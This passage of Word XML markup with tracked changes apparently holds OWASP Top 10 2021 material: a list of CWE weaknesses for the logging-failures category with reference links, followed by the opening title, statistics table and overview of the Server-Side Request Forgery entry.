        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>mapped_cwes</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>", name=title ~ ": List of Mapped CWEs", lang=lang, source=source ~ "#" ~ id, parent=</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>osib</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>) }}</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="133E502E" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3444" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5896A351" w14:textId="14514104" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3445" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>- [CWE-117: Improper Output Neutralization</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> for </w:t>
      </w:r>
      <w:del w:id="3446" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>detecting known vulnerable JavaScript libraries</w:delText>
        </w:r>
      </w:del>
      <w:proofErr w:type="gramStart"/>
      <w:ins w:id="3447" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Logs</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>](</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>https://</w:t>
      </w:r>
      <w:del w:id="3448" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>github.com/retirejs/retire.js/)</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="3449" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">cwe.mitre.org/data/definitions/117.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="26043384" w14:textId="38B4F80E" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00E13797" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="3450" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* [Node Libraries</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="3451" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>- [CWE-223: Omission of</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Security</w:t>
      </w:r>
      <w:del w:id="3452" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> Advisories</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="3453" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-relevant </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Information</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>](</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>https://</w:t>
      </w:r>
      <w:del w:id="3454" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>nodesecurity.io/advisories)</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="3455" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">cwe.mitre.org/data/definitions/223.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0A3927AC" w14:textId="119CFAD2" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00E13797" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3456" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="3457" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* [Ruby Libraries Security Advisory Database and Tools](https://rubysec.com/)</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="3458" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-532: Insertion of Sensitive Information into Log </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>File](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/532.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="4DB3A75B" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3459" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3460" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-778: Insufficient </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Logging](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/778.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="00283EE8" w14:textId="77777777" w:rsidR="00E300D6" w:rsidRDefault="00E300D6" w:rsidP="00AC649A">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="2301EC87" w14:textId="7777777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1BDBAAE6"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"https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_(SSRF)/"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5537EFBA" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>title:   "A10:2021 – Server-Side Request Forgery (SSRF)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DF498EC" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>id:      "A10:2021"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B9B7439"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65C6640E"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06F95384" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>#A10:2021 – Server-Side Request Forgery (</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">SSRF)   </w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">  ![icon](assets/TOP_10_Icons_Final_SSRF.png){: style="height:80px;width:80px" align="right"} {{ </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>osib_anchor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name="Server-Side Request Forgery (SSRF)", lang=lang, source=source, parent=parent) }}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42F2B396" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3461" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="73E0684A" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3462" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3463" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>## Factors</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="030DE72E" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3464" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="476A92C6" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3465" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3466" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>| CWEs Mapped | Max Incidence Rate | Avg Incidence Rate | Avg Weighted Exploit | Avg Weighted Impact | Max Coverage | Avg Coverage | Total Occurrences | Total CVEs |</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="5E8D7F36" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3467" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3468" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>|:-------------:|:--------------------:|:--------------------:|:--------------:|:--------------:|:----------------------:|:---------------------:|:-------------------:|:------------:|</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="75561DD2" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3469" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3470" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>| 1           | 2.72%              | 2.72%              | 8.28                 | 6.72                | 67.72%       | 67.72%       | 9,503             | 385        |</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="03C2EE04" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3471" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6831B225" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3472" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3473" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>## Overview</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="558C131A" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3474" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="79C5A83B" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3475" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3476" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>This category is added from the Top 10 community survey (#1). The data shows a</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="2ED3CCD5" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3477" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3478" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>relatively low incidence rate with above average testing coverage and</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0E65C25A" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3479" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3480" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>above-average Exploit and Impact potential ratings. As new entries are</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="70DDA84C" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3481" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3482" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>likely to be a single or small cluster of Common Weakness Enumerations (CWEs)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="028E4EE5" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3483" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3484" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>for attention and</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="28754E3B" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3485" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3486" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>awareness, the hope is that they are subject to focus and can be rolled</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="3746F944" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3487" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3488" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>into a larger category in a future edition.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="38D5694A" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3489" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6E350F93" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3490" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3491" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
